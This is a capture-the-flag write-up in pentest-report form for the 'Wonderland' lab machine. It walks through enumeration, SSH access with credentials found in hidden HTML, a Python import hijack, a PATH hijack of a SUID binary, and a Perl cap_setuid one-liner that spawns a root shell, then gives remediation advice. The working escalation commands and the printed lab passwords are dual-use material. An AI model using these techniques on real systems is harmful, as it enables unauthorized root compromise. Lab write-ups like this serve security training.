# Wonderland — CTF Writeup — Enumeration, Exploitation, and Privilege Escalation

## 1. Engagement Overview
- **Title / Project Name:** Wonderland (CTF room)
- **Author:** (Your name / handle)
- **Date / Scan:** 2025-11-03 (local scan timestamps)
- **Objective:** Capture user and root flags by enumerating HTTP/SSH services, abusing sudo/suid misconfigurations, and leveraging import/PATH hijacks and privileged capabilities.
- **Scope / Target:** `10.201.25.126`
- **Tools Used:** nmap, gobuster, ssh, scp, linPEAS, telnet, basic unix utilities, GTFOBins references
- **Methodology Reference:** Recon → Enumeration → Exploitation → Post-exploitation → Cleanup

## 2. Short Summary
Found SSH and an HTTP Go server. Web enumeration revealed a chained `/r/...` path with hidden content and an embedded HTML credential for `alice`. SSHed as `alice`. Sudo allowed running a Python script as user `rabbit` — exploited via import hijack (malicious `random.py`) to get a `rabbit` shell. From `rabbit`, abused a SUID `teaParty` binary via PATH hijack to obtain `hatter`. As `hatter`, discovered Perl with `cap_setuid+ep` and used a GTFOBins-style Perl one-liner to spawn a root shell. Final root flag retrieved (removed from writeup).

## 3. Methodology / Process Flow

### 3.1 Reconnaissance
**Commands**
```bash
nmap -sC -sV 10.201.25.126
telnet 10.201.25.126 22
```
**Key output (summary)**
- `22/tcp` — ssh (OpenSSH 7.6p1 Ubuntu 4ubuntu0.3)
- `80/tcp` — http (Golang net/http server — HTTP title: "Follow the white rabbit")
- Nmap timestamp: 2025-11-03 11:15 GMT

### 3.2 Web enumeration
**Commands**
```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.201.25.126/
```
**Findings**
- Discovered `/img/` (images) and `/r/` which contained long chained paths (e.g., `/r/a/b/b/i/t/...`) and progressive content inviting "Follow the white rabbit".
- Page source contained hidden credentials: `<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>`

### 3.3 Initial Access — SSH as alice
**Action**
```bash
ssh alice@10.201.25.126
# password: HowDothTheLittleCrocodileImproveHisShiningTail
```
**Result**
- Logged in as `alice` on Ubuntu 18.04.4 LTS. Confirmed with `whoami`.

### 3.4 Host enumeration
- Transferred linPEAS to `/home/alice/` and ran for automated checks:
```bash
scp linpeas.sh alice@10.201.25.126:/home/alice/
# on target: sh /home/alice/linpeas.sh
```
- Checked alice's home: found `root.txt` (owned by root) and `walrus_and_the_carpenter.py` (Python script that imports `random` and prints quotes).

### 3.5 Sudo discovery & import hijack to become rabbit
**Command**
```bash
sudo -l
```
**Output**
```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
**Exploit approach**
- Created `random.py` in a location Python will import from (e.g., current directory) containing:
```python
import os
os.system("/bin/bash")
```
- Ran the sudo command as `rabbit`:
```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
**Result**
- Spawned a shell as `rabbit`.

### 3.6 PATH hijack & SUID `teaParty` to become hatter
**Observations under rabbit**
- Found `/home/rabbit/teaParty` executable with the SUID bit set. The binary uses `date` in its output without absolute path.
**Exploit approach**
- Prepend `/tmp` to `PATH` and place a malicious `date` script that spawns a shell:
```bash
export PATH=/tmp:$PATH
cat > /tmp/date <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /tmp/date
./teaParty
```
**Result**
- Executing `teaParty` gave a shell as `hatter`. Located `/home/hatter/password.txt` containing `WhyIsARavenLikeAWritingDesk?` (hatter's password / secret).

### 3.7 Final escalation — Perl capability abuse to obtain root
- Re-ran linPEAS as `hatter` and found file capabilities including `cap_setuid+ep` on `/usr/bin/perl`.
- Used GTFOBins-style Perl one-liner to set UID to 0 and spawn a root shell:
```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
**Result**
- Root shell obtained (`whoami` → `root`). Read final flag (omitted from this writeup).

### 3.8 Persistence / Cleanup
- Remove transferred and created helper files in lab/CTF environment after use:
```bash
rm /home/alice/linpeas.sh /home/alice/random.py /tmp/date
```

## 4. Findings Summary
| ID | Vulnerability / Issue | Severity | Impact | Recommendation |
|----|------------------------|---------:|--------|----------------|
| 1 | Plaintext credentials embedded in web content | Medium | Initial access via SSH | Remove credentials from web pages; use secure vaults and environment-specific configs |
| 2 | Sudoers allowing script execution as another user (rabbit) | High | Privilege escalation via import hijack | Avoid sudo rules that execute scripts; use command whitelisting and restrict environments |
| 3 | SUID binary (`teaParty`) calling external programs without absolute paths | High | Local privilege escalation via PATH hijack | Remove SUID where unnecessary; ensure binaries use absolute paths and sanitize environment |
| 4 | File capabilities on interpreters (Perl cap_setuid) | Critical | Direct root escalation via capability abuse | Audit and remove unnecessary capabilities; restrict capability usage to vetted binaries |

## 5. Technical Details

### Finding 1 — Credentials in hidden web elements
- **Description:** Hidden HTML contained plaintext credentials for `alice`.
- **Evidence:** Page source included `<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>`
- **Recommendation:** Remove hardcoded credentials from web content and use secure configuration management.

### Finding 2 — sudo script execution as rabbit (import hijack)
- **Description:** Sudoers allowed alice to run a Python script as `rabbit`. The script imported `random`, which was hijackable by placing a malicious `random.py` in import paths.
- **Exploit steps:** Created `random.py` to exec `/bin/bash`, then executed the sudo command as rabbit to spawn a shell.
- **Recommendation:** Do not allow execution of scripts via sudo; use absolute imports, limit environment, or use `sudoedit`/wrappers.

### Finding 3 — SUID `teaParty` invoking `date` (PATH hijack)
- **Description:** SUID binary executed `date` without absolute path, enabling PATH hijack by placing a malicious `date` earlier in PATH to escalate to the binary's owner (hatter).
- **Exploit steps:** Created `/tmp/date` that spawns a shell, prefixed PATH, and executed `teaParty` to obtain hatter shell.
- **Recommendation:** Avoid SUID binaries that call external programs insecurely; use absolute paths and drop privileges appropriately.

### Finding 4 — Perl with cap_setuid+ep capability
- **Description:** `/usr/bin/perl` had `cap_setuid+ep` allowing privilege escalation by setting effective UID to 0.
- **Exploit steps:** Executed Perl one-liner to `setuid(0)` then spawn `/bin/sh`.
- **Recommendation:** Audit capabilities and remove `cap_setuid` from interpreters when not required.

## 6. Remediation Plan
- Remove embedded credentials from public web content; store secrets in secure vaults or environment variables.
- Remove or restrict sudo rules that permit running scripts; enforce command whitelisting and sanitized environments.
- Remove SUID bit from non-essential binaries like `teaParty` and ensure invoked external programs use absolute paths.
- Audit and remove unnecessary file capabilities (e.g., `cap_setuid` on Perl); restrict capability changes to vetted system utilities.

## 7. Appendix: Commands Used
```bash
# Recon
nmap -sC -sV 10.201.25.126
telnet 10.201.25.126 22

# Web enumeration
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.201.25.126/

# SSH
ssh alice@10.201.25.126

# Transfer linPEAS
scp linpeas.sh alice@10.201.25.126:/home/alice/

# Sudo & import hijack
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
# create /home/alice/random.py with os.system("/bin/bash")

# PATH hijack & teaParty SUID abuse
export PATH=/tmp:$PATH
# create /tmp/date that runs /bin/bash and chmod +x /tmp/date
./teaParty

# Perl capability abuse
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# Cleanup
rm /home/alice/linpeas.sh /home/alice/random.py /tmp/date
```

---
*Report generated using the pentest template.*
